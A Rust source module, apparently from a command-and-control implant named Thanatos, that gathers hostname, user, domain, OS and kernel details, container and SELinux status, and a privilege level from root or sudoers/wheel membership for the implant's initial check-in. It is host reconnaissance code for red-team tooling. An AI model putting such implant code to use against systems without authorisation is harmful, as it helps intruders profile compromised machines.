use std::{
    ffi::CString,
    io::{BufRead, BufReader},
};

use errors::ThanatosError;
use ffiwrappers::{
    errors::FfiError,
    linux::{
        addrinfo::{AddrInfoList, AiFlags, Hints},
        socket::SockType,
        uname,
        user::UserInfo,
    },
};

use crate::proto::checkin::Architecture;

#[derive(Default, Debug)]
pub struct OsReleaseInfo {
    name: String,
    version: String,
    pretty_name: Option<String>,
}

pub fn hostname() -> Result<String, ThanatosError> {
    let h = ffiwrappers::linux::gethostname().map_err(ThanatosError::FFIError)?;
    Ok(h.split('.').next().unwrap_or(&h).to_string())
}

pub fn username() -> Result<String, ThanatosError> {
    UserInfo::current_user()
        .map(|userinfo| userinfo.username().to_string())
        .map_err(ThanatosError::FFIError)
}

pub fn domain() -> Result<String, ThanatosError> {
    let current_host = ffiwrappers::linux::gethostname().map_err(ThanatosError::FFIError)?;
    let current_host =
        CString::new(current_host).map_err(|_| ThanatosError::FFIError(FfiError::InteriorNull))?;

    let addrlist = AddrInfoList::new(
        Some(&current_host),
        None,
        Some(Hints {
            socktype: SockType::SockDgram,
            flags: AiFlags::CANONNAME,
            family: Default::default(),
        }),
    )
    .map_err(ThanatosError::FFIError)?;

    let canonname = addrlist.first().canonname().to_string();

    let mut s = canonname.split('.');
    s.next()
        .ok_or(ThanatosError::FFIError(FfiError::CanonNameNotFound))?;
    Ok(s.collect::<Vec<&str>>().join("."))
}

// TODO: Make this return an enum value for the container environment and return
// it as a separate field in the initial check in
pub fn check_container_environment() -> Option<&'static str> {
    if let Ok(readdir) = std::fs::read_dir("/") {
        for entry in readdir.flatten() {
            if entry.file_name() == ".dockerenv" {
                return Some("Docker");
            }
        }
    }

    if let Ok(readdir) = std::fs::read_dir("/run") {
        for entry in readdir.flatten() {
            if entry.file_name() == ".containerenv" {
                return Some("Container");
            }
        }
    }

    None
}

// TODO: Return this into a separate initial check in field.
// Parse /proc/self/mountinfo for selinux detection instead of looking for /sys/fs/selinux
pub fn check_selinux() -> bool {
    if let Ok(readdir) = std::fs::read_dir("/sys/fs") {
        for entry in readdir.flatten() {
            if entry.file_name() == "selinux" {
                return true;
            }
        }
    }

    false
}

pub fn os_release() -> Result<OsReleaseInfo, ThanatosError> {
    let f = std::fs::File::open("/etc/os-release").map_err(ThanatosError::IoError)?;
    let reader = BufReader::new(f);

    let mut release_info = OsReleaseInfo::default();
    for line in reader.lines().map_while(Result::ok) {
        if line.starts_with("NAME=") {
            let s = line.split('=');
            if let Some(name_quoted) = s.last() {
                release_info.name = name_quoted[1..name_quoted.len() - 1].to_string();
            }
            continue;
        }

        if line.starts_with("VERSION=") {
            let s = line.split('=');
            if let Some(version_quoted) = s.last() {
                release_info.version = version_quoted[1..version_quoted.len() - 1].to_string();
            }

            continue;
        }

        if line.starts_with("PRETTY_NAME=") {
            let s = line.split('=');
            if let Some(pretty_name_quoted) = s.last() {
                release_info.pretty_name =
                    Some(pretty_name_quoted[1..pretty_name_quoted.len() - 1].to_string());
            }

            continue;
        }
    }

    Ok(release_info)
}

// TODO: Split up platform values into separate check in fields and create the platform
// string server side. Also grab the architecture from the initial check in instead
// of embedding it into this string
pub fn platform() -> String {
    let distro = os_release()
        .map(|os_info| {
            os_info
                .pretty_name
                .unwrap_or_else(|| format!("{} {}", os_info.name, os_info.version))
        })
        .unwrap_or_else(|_| "Linux".to_string());

    let utsname = uname::UtsName::new();

    let mut platform_name = match utsname {
        Ok(utsname) => format!(
            "{} kernel {} {}",
            distro,
            utsname.release(),
            utsname.machine()
        )
        .to_string(),
        Err(_) => distro,
    };

    if check_selinux() {
        platform_name.push_str(" (SELinux)");
    }

    if let Some(runtime) = check_container_environment() {
        platform_name.push_str(&format!(" ({runtime})"));
    }

    platform_name
}

pub fn architecture() -> Architecture {
    #[cfg(target_arch = "x86_64")]
    let mut arch = Architecture::X8664;

    #[cfg(target_arch = "x86")]
    let mut arch = Architecture::X86;

    if let Ok(utsname) = uname::UtsName::new() {
        match utsname.machine() {
            "x86_64" => arch = Architecture::X8664,
            "x86" => arch = Architecture::X86,
            _ => (),
        }
    }

    arch
}

pub fn integrity_level() -> Result<u32, ThanatosError> {
    let effective_user = UserInfo::effective_user().map_err(ThanatosError::FFIError)?;
    if effective_user.uid() == 0 {
        return Ok(4);
    }

    let current_groups = UserInfo::current_user()
        .map_err(ThanatosError::FFIError)?
        .group_membership()
        .map_err(ThanatosError::FFIError)?;

    for group in current_groups.members {
        if group.gid() == 0 {
            return Ok(3);
        }

        if group.groupname() == "sudoers" {
            return Ok(3);
        }

        if group.groupname() == "wheel" {
            return Ok(3);
        }
    }

    Ok(2)
}

pub fn process_name() -> Result<String, ThanatosError> {
    std::fs::read_to_string("/proc/self/comm").map_err(ThanatosError::IoError)
}

#[cfg(test)]
mod tests {
    use std::ffi::CString;

    use ffiwrappers::linux::{
        addrinfo::{AddrInfoList, AiFlags, Hints},
        socket::SockType,
    };

    #[test]
    fn hostname_test() {
        let hostname = super::hostname().unwrap();
        assert!(!hostname.starts_with('.'));
        assert!(!hostname.ends_with('.'));
    }

    #[test]
    fn domain_test() {
        let domain = super::domain().unwrap();
        assert!(!domain.starts_with('.'));
        assert!(!domain.ends_with('.'));
    }

    #[test]
    fn fqdn_canonname_test() {
        let host = super::hostname().unwrap();
        let domain = super::domain().unwrap();

        let mut fqdn = format!("{}.{}", host, domain);

        if !fqdn.ends_with('.') {
            fqdn.push('.');
        }

        let current_host = ffiwrappers::linux::gethostname().unwrap();
        let current_host = CString::new(current_host).unwrap();

        let addrlist = AddrInfoList::new(
            Some(&current_host),
            None,
            Some(Hints {
                socktype: SockType::SockDgram,
                flags: AiFlags::CANONNAME,
                family: Default::default(),
            }),
        )
        .unwrap();

        let mut canonname = addrlist.first().canonname().to_string();

        if !canonname.ends_with('.') {
            canonname.push('.');
        }

        assert_eq!(canonname, fqdn);
    }

    #[test]
    fn platform_test() {
        let platform = super::platform();
        dbg!(platform);
    }

    #[test]
    fn os_release_test() {
        let distro = super::os_release().unwrap();
        dbg!(distro);
    }
}
